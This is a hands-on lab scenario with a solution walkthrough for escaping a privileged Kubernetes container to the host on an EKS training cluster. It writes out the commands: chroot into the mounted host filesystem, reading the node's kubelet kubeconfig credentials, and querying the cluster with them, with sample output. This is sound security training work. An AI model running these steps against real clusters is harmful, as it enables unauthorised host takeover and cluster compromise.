# Scenario: Escape to the Host System

## Prerequisites

- Vision One Container Security
- Playground One EKS Cluster
- Playground One Scenarios
  - Running app: System Monitor

Ensure to have the EKS Cluster including the Scenarios up and running:

```sh
$ pgo --apply eks
$ pgo --apply scenarios
```

## Attribution

This scenario is based on [Kubernetes Goat](https://madhuakula.com/kubernetes-goat/docs/) but adapted to work an Playground One and EKS.

## Disclaimer

> ***Note:*** It is highly recommended to have the `awsone.access_ip` set to a single IP or at least a small CIDR before deploying the EKS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.

## Overview

This scenario showcases the common misconfigurations and one of the error-prone security issues in Kubernetes, container environments, and the general security world. Giving privileges that are not required for things always makes security worse. This is especially true in the containers and Kubernetes world. You can also apply this scenario further and beyond the container to other systems and services based on the configuration and setup of the cluster environments and resources. In this scenario you will see a privileged container escape to gain access to the host system.

By the end of the scenario, you will understand and learn the following:

- Able to exploit the container and escape out of the docker container
- You will learn to test and exploit the misconfigured and privileged containers
- Learn about common misconfigurations and possible damage due to them for the containers, Kubernetes, and clusterized environments

## The story

Most of the monitoring, tracing, and debugging software requires extra privileges and capabilities to run. In this scenario, you will see a pod with extra capabilities and privileges including HostPath allowing you to gain access to the host system and provide Node level configuration to gain complete cluster compromise.

> ***Note:*** To get started with the scenario, navigate to `http://<loadbalancer_dns_system_monitor>`

## Goals

The goal of this scenario is to escape out of the running docker container on the host system using the available misconfigurations. The secondary goal is to use the host system-level access to gain other resources access and if possible even go beyond this container, node, and cluster-level access.

> ***Tip:*** Gain access to the host system and obtain the node level kubeconfig file `/var/lib/kubelet/kubeconfig`, and query the Kubernetes nodes using the obtained configuration.

### Hints

<details>
<summary>Click here</summary>

*✨ Are you still in the container?*<br>

See the mounted file systems, also look the capabilities available for the container using capsh 🙌<br>
<br>
*✨ Escaped container?*<br>

You can recon the system, some interesting places to obtain the node level configuration are `/var/lib/kubelet/kubeconfig` and I hope you know how to query Kubernetes API for nodes? 🎉<br>

</details>

## Solution & Walkthrough

<details>
<summary>Click here</summary>

After performing the analysis, you can identify that this container has full privileges of the host system and allows privilege escalation. As well as `/host-system` is mounted.

```sh
$ capsh --print
```

```sh
$ mount
```

Now you can explore the mounted file system by navigating to the `/host-system` path

```sh
$ ls /host-system/
```

You can gain access to the host system privileges using `chroot`.

```sh
$ chroot /host-system bash
```

As you can see, now you can access all the host system resources like docker containers, configurations, etc.

Trying to use the docker client fails.

```sh
$ docker ps
```

```ascii
bash: docker: command not found
```

This does not work, since we're on a Kubernetes optimized node OS with no docker provided.

```sh
$ uname -a
```

```ascii
Linux system-monitor-6dfbdbb7d-w6mdv 5.10.184-175.749.amzn2.x86_64 #1 SMP Wed Jul 12 18:40:28 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

The Kubernetes node configuration can be found at the default path, which is used by the node level kubelet to talk to the Kubernetes API Server. If you can use this configuration, you gain the same privileges as the Kubernetes node.

```sh
$ cat /var/lib/kubelet/kubeconfig
```

```ascii
apiVersion: v1
kind: Config
clusters:
- cluster:
    certificate-authority: /etc/kubernetes/pki/ca.crt
    server: https://BD215DBE2E4127977439D904B2AD3307.gr7.eu-central-1.eks.amazonaws.com
  name: kubernetes
contexts:
- context:
    cluster: kubernetes
    user: kubelet
  name: kubelet
current-context: kubelet
users:
- name: kubelet
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1beta1
      command: /usr/bin/aws-iam-authenticator
      args:
        - "token"
        - "-i"
        - "playground-one-eks"
        - --region
        - "eu-central-1"
```

Sadly, there is no `kubectl` as well.

```sh
$ kubectl
```

```ascii
bash: kubectl: command not found
```

Trying to use the package manager `yum` will not solve the problem. But navigating to https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux will help:

```sh
$ cd
$ curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
$ chmod +x kubectl
```

Try to get the available nodes of our cluster:

```sh
$ ./kubectl --kubeconfig /var/lib/kubelet/kubeconfig get nodes 
```

```ascii
NAME                                            STATUS   ROLES    AGE   VERSION
ip-10-0-152-251.eu-central-1.compute.internal   Ready    <none>   56m   v1.25.11-eks-a5565ad
ip-10-0-169-117.eu-central-1.compute.internal   Ready    <none>   56m   v1.25.11-eks-a5565ad
```

Can you do more?

```sh
$ ./kubectl --kubeconfig /var/lib/kubelet/kubeconfig get pods -A
```

```ascii
NAMESPACE           NAME                                               READY   STATUS    RESTARTS   AGE
goat                system-monitor-6dfbdbb7d-w6mdv                     1/1     Running   0          53m
kube-system         aws-load-balancer-controller-577dcc6f77-sqtfr      1/1     Running   0          92m
kube-system         aws-node-8wl6v                                     1/1     Running   0          92m
kube-system         aws-node-ksdjv                                     1/1     Running   0          92m
kube-system         cluster-autoscaler-6696cf9bff-2s52q                1/1     Running   0          92m
kube-system         coredns-6bcddfff7-hrwwl                            1/1     Running   0          92m
kube-system         coredns-6bcddfff7-kp266                            1/1     Running   0          92m
kube-system         ebs-csi-controller-7dffd5b9fd-2w7r8                6/6     Running   0          92m
kube-system         ebs-csi-controller-7dffd5b9fd-fdhfc                6/6     Running   0          92m
kube-system         ebs-csi-node-k77sx                                 3/3     Running   0          92m
kube-system         ebs-csi-node-vj6c7                                 3/3     Running   0          92m
kube-system         kube-proxy-62dls                                   1/1     Running   0          92m
kube-system         kube-proxy-mshz7                                   1/1     Running   0          92m
trendmicro-system   trendmicro-admission-controller-74d8d7f866-dv87r   1/1     Running   0          53m
trendmicro-system   trendmicro-oversight-controller-557df87c9-6c4dx    2/2     Running   0          69m
trendmicro-system   trendmicro-scan-manager-6ddb6f69b8-r85dk           1/1     Running   0          53m
trendmicro-system   trendmicro-scout-gkl4k                             2/2     Running   0          69m
trendmicro-system   trendmicro-scout-tz68w                             2/2     Running   0          69m
trendmicro-system   trendmicro-usage-controller-6944c5b55b-m8hgh       2/2     Running   0          53m
trendmicro-system   trendmicro-workload-operator-6cf5c98c6f-xq8bb      1/1     Running   0          69m
trivy-system        trivy-operator-57c774d7c4-hmnlk                    1/1     Running   0          53m
victims             java-goof-5878dd4dd-9lnst                          1/1     Running   0          53m
victims             web-app-854bdf944f-ddqcs                           1/1     Running   0          53m
```

```sh
$ ./kubectl --kubeconfig /var/lib/kubelet/kubeconfig get nodes 
```

```ascii
NAME                                            STATUS   ROLES    AGE   VERSION
ip-10-0-152-251.eu-central-1.compute.internal   Ready    <none>   76m   v1.25.11-eks-a5565ad
ip-10-0-169-117.eu-central-1.compute.internal   Ready    <none>   76m   v1.25.11-eks-a5565ad
```

🎉 Success 🎉

</details>
